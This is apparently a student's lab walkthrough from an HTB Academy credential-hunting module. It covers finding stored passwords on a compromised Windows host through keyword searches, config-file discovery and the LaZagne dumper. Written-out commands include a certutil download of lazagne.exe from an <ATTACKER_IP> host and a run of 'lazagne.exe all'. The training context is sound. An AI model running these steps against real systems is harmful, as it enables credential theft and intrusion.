# 🔐 Credential Hunting in Windows
This lab focuses on identifying stored credentials on a compromised Windows system using native search, command-line tools, and credential dumping utilities.

---

## 🧪 Lab Setup

- **Access Method:** RDP
- **RDP Tool:** `xfreerdp`

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>

🔍 Techniques and Tools Used
✅ 1. GUI-Based Search
Used Windows search bar to look for files containing common credential keywords such as:

password, creds, login, access, username, gitlab, winSCP
Discovered files related to saved SSH credentials and GitLab access tokens.

✅ 2. findstr Command-Line Search
Searched files for sensitive keywords like "gitlab":

findstr /SIM /C:"gitlab" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
Located a plaintext file containing credentials related to GitLab stored on the desktop.

✅ 3. Using LaZagne for Credential Extraction
Step 1: Downloaded LaZagne on the attacker machine

wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
Step 2: Hosted file via Python HTTP server

python3 -m http.server
Step 3: Transferred file to target system

certutil -urlcache -split -f "http://<ATTACKER_IP>:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe
Step 4: Executed LaZagne to extract credentials

C:\Windows\Temp\lazagne.exe all
Found stored credentials for applications like WinSCP.

✅ 4. Script and File Discovery
Explored directories such as C:\Automation&Scripts\ and discovered:

A PowerShell script used for provisioning Active Directory users (contained default password logic).
Ansible configuration files with router access credentials.

🛠 Tools Used
| Tool / Command           | Purpose                             |
| ------------------------ | ----------------------------------- |
| `xfreerdp`               | Remote Desktop access               |
| `findstr`                | Keyword-based file content search   |
| `wget`                   | Download files to attacker machine  |
| `python3 -m http.server` | Serve files to the victim system    |
| `certutil`               | Download files from HTTP on Windows |
| `LaZagne`                | Dump stored application credentials |
| `type <file>`            | View contents of discovered files   |

📌 Key Takeaways
Credential hunting is effective when aligned with system role (e.g., admin workstation).
Stored credentials are often found in misconfigured scripts or user-created plaintext files.
LaZagne is powerful for uncovering credentials stored in apps and Windows services.
Use keyword searches and enumeration of common folders to guide discovery.
Always maintain operational security—never exfiltrate real credentials outside lab environments.
Author: Mani Kiran Palle
Training: HTB Academy — Credential Hunting Module
GitHub: https://github.com/manikiran237
